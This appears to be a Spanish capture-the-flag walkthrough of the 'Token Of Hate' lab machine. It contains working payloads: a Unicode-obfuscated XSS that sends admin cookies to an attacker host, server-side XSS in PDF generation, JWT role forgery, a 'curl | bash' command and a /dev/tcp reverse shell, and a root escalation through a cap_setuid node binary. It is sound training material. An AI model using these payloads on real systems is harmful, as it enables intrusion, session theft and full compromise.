Máquina **Token Of Hate** de la plataforma [The Hackers Labs](https://thehackerslabs.com/token-of-hate)

Autor: Lenam

Dificultad: Experto

![Token Of Hate](images/toh/tokenofhate.png)

# Reconocimiento

Antes que nada, agregaremos un dominio a la máquina en el archivo `/etc/hosts`, ya que aunque no lo tenga nos facilitará los comandos y demás en un futuro para no tener que recordar la ip todo el tiempo:

```css
192.168.56.115 toh.com
```

Ahora realizaremos un escaneo de `nmap` para descubrir los puertos abiertos de la máquina:

```css
nmap -p- --open --min-rate 5000 -sS -sC -sV -n -Pn -vvv toh.com -oN targeted
```

`-p-`: Para indicarle a `nmap` que abarque el rango de 65535 puertos en total.

`--open`:  Para indicar que solo queremos que nos muestre los puertos abiertos.

`--min-rate 5000`: Para indicarle a `nmap` que queremos tramitar paquetes no menores a 5000 paquetes por segundo.

`-sS`: Para aplicar un escaneo de tipo `SYN Stealth scan`.

`-sC`: Para aplicar unos scripts básicos de reconocimiento.

`-sV`: Para poder identificar la versión de los servicios que encontremos abiertos.

`-vvv`: Esto para que a medida que va encontrando los puertos nos lo imprima por el terminal.

`-oN`: Para exportar el escaneo en formato nmap (osea como se nos imprime por consola).

```ruby
# Nmap 7.95 scan initiated Sun Mar  9 18:02:52 2025 as: nmap -p22,80 -sCV -oN targeted toh.com
Nmap scan report for toh.com (192.168.56.115)
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 fd:6a:70:17:f7:40:07:fe:eb:5a:5d:36:56:32:f0:39 (ECDSA)
|_  256 2d:3d:4b:a1:f6:e3:8d:91:09:4c:a8:b3:85:7d:b5:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  9 18:02:59 2025 -- 1 IP address (1 host up) scanned in 7.05 seconds
```

 Podemos ver 2 puertos abiertos:

 • `Puerto 22: OpenSSH 9.2p1 Debian`

 • `Puerto 80: Apache httpd 2.4.62`

y podemos ver que es un debian.

### Puerto 80

En el puerto 80 podemos ver unos datos bastante interesantes:

```css
En nuestra plataforma Token Of Hate, los nombres de usuario pueden contener caracteres Unicode, lo que permite el uso de acentos, caracteres especiales y emojis para una mayor personalización y accesibilidad. Sin embargo, para garantizar la compatibilidad con sistemas más antiguos y ciertos procesos internos, utilizaremos una versión ASCII equivalente de cada nombre de usuario.
```

como vemos, dice que pasa caracteres unicode a ascii para tener compatibilidad con equipos viejos, y si buscamos un poco para ver si podemos aprovechar algo como eso, veremos que podemos aprovecharlo para muchas cosas: [Bypass_WAF_Unicode](https://jlajara.gitlab.io/Bypass_WAF_Unicode)

Además podemos ver otro mensaje que dice que el usuario administrador revisa constantemente los usuarios registrados, sabiendo esto podemos pensar que se reflejan en algún lado y podemos pensar en un `xss` para robar los cookies del admin. Para hacerlo, simplemente crearemos un payload el cual nos envíe las cookies y luego utilizaremos un script muy simple que solo reemplaza caracteres por unos parecidos, lo cual hará que al pasarlo a ascii y representarse en la página se de el `xss` ya que nuestro payload volverá a la normalidad:

```html
<script>fetch("http://192.168.56.1:5454/c?=" + document.cookie);</script>
```

esto lo metemos en un archivo llamado payload.

Ahora, creamos el script:

```css
#!/bin/bash



if [ $# != 1 ]; then
  echo -e "Error"
  exit 1
fi

archivo=$1

cat $archivo | sed 's/>/﹥/g' | sed 's/</＜/g' | sed 's/(/⁽/g' | sed 's/)/⁾/g' | sed 's/=/⁼/g' | sed 's/"/＂/g' | sed "s/'/＇/g" | sed 's/{/﹛/g' | sed 's/}/﹜/g' | sponge $archivo
```

y listo, ya tenemos ambas cosas. Ahora simplemente ejecutamos el script de la siguiente manera:

```css
bash script.sh payload
```

escuchamos con `python3` por el puerto 5454:

```css
python3 -m http.server 5454
```

y nos registramos con el payload.

Al cabo de unos segundos, nos llegará la siguiente petición con la cookie del usuario administrador:

```css
192.168.56.115 - - [09/Mar/2025 18:16:14] "GET /c?=PHPSESSID=ambo7dh21va6bh8l92igc77fe5 HTTP/1.1" 404 -
```

ahora creamos una cuenta normal, iniciamos sesión y reemplazamos nuestra cookie por la del admin.

Una vez dentro, podemos ver que se puede generar un pdf con la lista de usuarios, y sabemos que se genera dinamicamente ya que utiliza los nombres de los usuarios para hacerlo (lo cual nosotros podemos controlar registrando uno). Viendo esto podemos aprovecharlo para muchas cosas, como hacer peticiones GET y POST para poder leer archivos internos de la máquina, o no solo para eso, si no que también para obtener el contenido de páginas y demás. Mas info: [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html?highlight=dynamic%20pdf#server-side-xss-dynamic-pdf-1)

Luego de probar distintos puertos con este payload (registrando el usuario y descargando el pdf):

```css
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","http://localhost:80/");x.send();</script>
```

logro encontrar el puerto 3000 abierto y veo que dice lo siguiente:

```json
{"name":"API de Comandos con JWT (CTF)","version":"1.2.0","description":"API para autenticación y ejecución de
comandos utilizando JWT. En este reto, la validación del token es vulnerable y permite modificar el parámetro \"role\"
para obtener acceso a /command (solo para rol admin).","endpoints":{"/":{"method":"GET","description":"Muestra la
información de la API y la descripción de los endpoints disponibles."},"/login":{"method":"POST","description":"Permite
iniciar sesión. Se espera un body en formato JSON con 'username' y 'password'. Si el login es correcto, se retorna un
token JWT. Ejemplo: { \"username\": \"jose\", \"password\": \"FuLqqEAErWQsmTQQQhsb\" }"},"/command":
{"method":"POST","description":"Ejecuta un comando del sistema para usuarios autenticados con rol admin. Se espera
un body en formato JSON con 'command' y 'token' o enviando el token en la cabecera 'Authorization'. Ejemplo: {
\"command\": \"ls -la\", \"token\": \"token_jwt\" }"}}}
```

# Intrusión

Como podemos ver, es una api en la cual tenemos que logearnos para obtener un `json web token`, luego de logearnos, podemos ejecutar un comando pasando el `jwt` y el comando pero solo si nuestro usuario es admin. Sabiendo esto, podemos primero script para logearnos:

```js
const xhr = new XMLHttpRequest();
xhr.open("POST", "http://127.0.0.1:3000/login", true);
xhr.setRequestHeader("Content-Type", "application/json");

xhr.onload = function () {
    fetch("http://192.168.56.1:7070/?d=" + encodeURIComponent(xhr.responseText));
};

const data = JSON.stringify({
    "username": "Jose",
    "password": "FuLqqEAErWQsmTQQQhsb"
});

xhr.send(data);
```

este no lo pasaremos a la web, este lo crearemos en nuestra propia máquina como `jwt.js`. Ahora si creamos el payload:

```html
<script src="http://192.168.56.1:9090/jwt.js"></script>
```

este lo transformamos y lo registramos en la web. Nuevamente creamos un servidor de python por el puerto 9090 y al cabo de un rato vemos lo siguiente por nuestro segundo servidor que se encuentra en el puerto 7070:

```css
192.168.56.115 - - [09/Mar/2025 20:05:15] "GET /?d=%7B%22message%22%3A%22Login%20correcto%22%2C%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MTU2MTUxMywiZXhwIjoxNzQxNTY1MTEzfQ.ly0pUDu6TJ3UeyIfS729iUj47apiBvgLf4TbqNaKXjo%22%7D HTTP/1.1" 200 -
```

lo pasamos de url encode a ascii con un [urldecoder](https://www.urldecoder.org/) y veremos el mensaje real:

```css
{"message":"Login correcto","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MTU2MTUxMywiZXhwIjoxNzQxNTY1MTEzfQ.ly0pUDu6TJ3UeyIfS729iUj47apiBvgLf4TbqNaKXjo"}
```

Teniendo el token, lo pasamos por [jwt.io](https://jwt.io/) y modificamos el rol de "user" a "admin".

Ahora creamos un archivo llamado shell que contenga lo siguiente:

```css
bash -c 'bash -i >& /dev/tcp/192.168.56.1/443 0>&1'
```

luego, modificamos el script para que tenga el siguiente contenido (esto para no tener que volver a enviar un nuevo payload para cargar el js):

```js
var x = new XMLHttpRequest();
x.open("POST", "http://127.0.0.1:3000/command");
x.setRequestHeader("Content-Type", "application/json");

x.send(JSON.stringify({
    "command": "curl 192.168.56.1:9090/shell | bash",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDE1Mzk2MjEsImV4cCI6MTc0MTU0MzIyMX0.Wfg-XIs6DVh8X2qTeqXb7Bs65OQTjBfvu8HrRLmSJUE"
}));
```

escuchamos en el puerto 443 con netcat:

```css
sudo nc -nlvp 443
```

y al recibir la petición también recibiremos una shell.

# Escalada De Privilegios

### Ctesias

Una vez dentro, luego de enumerar un rato, busco capabilities y veo lo siguiente:

```css
getcap -r / 2>/dev/null
```

```css
/usr/bin/yournode cap_setuid=ep
```

al comparar los hashes md5, noto que es realmente el binario `node`:

```css
ctesias@TheHackersLabs-TokenOfHate:/$ md5sum /usr/bin/node
8bededf9cf159842d8a281f2f6c3438a  /usr/bin/node
ctesias@TheHackersLabs-TokenOfHate:/$ md5sum /usr/bin/yournode
8bededf9cf159842d8a281f2f6c3438a  /usr/bin/yournode
ctesias@TheHackersLabs-TokenOfHate:/$ 
```

por lo que simplemente para escalar privilegios debemos ejecutarlo de la siguiente manera:

```css
/usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

Una vez ejecutado seremos **root**.

### Root

![Root](images/toh/root.png)

Gracias por leer ;)